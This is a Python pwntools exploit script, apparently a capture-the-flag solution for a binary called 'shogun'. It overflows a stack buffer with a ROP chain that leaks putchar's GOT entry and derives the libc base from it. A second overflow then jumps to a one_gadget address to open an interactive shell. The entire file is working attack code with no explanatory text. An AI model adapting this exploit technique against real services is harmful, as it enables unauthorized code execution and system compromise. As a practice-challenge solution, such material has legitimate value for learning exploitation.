#!/usr/bin/env python3

from pwn import *

exe = ELF("./shogun")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        r = gdb.debug([exe.path],
"""
b main
b encounter
c
""")

    else:
        r = remote("localhost", 1024)

    return r

rop = ROP(exe)
one_gadget = 0xe3b01

def main():
    r = conn()
    r.sendline(b"Look around.")

    r.recvuntil(b"He attacks you! ")
    payload = b'A' * 0x20 + p64(0x00000000404000 + 0x20)
    payload += p64(rop.rdi.address)
    payload += p64(exe.got.putchar)
    payload += p64(exe.symbols.main + 157)
    payload += p64(exe.symbols.scroll)
    payload += p64(exe.symbols.encounter + 27)
    r.send(payload)

    leak = r.recvn(6)
    putchar_addr = int.from_bytes(leak, "little")
    libc.address = putchar_addr - libc.symbols.putchar
    print(f"got leak {hex(putchar_addr)}, libc @ {hex(libc.address)}")
    
    payload = b'B' * 0x28
    payload += p64(libc.address + one_gadget)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
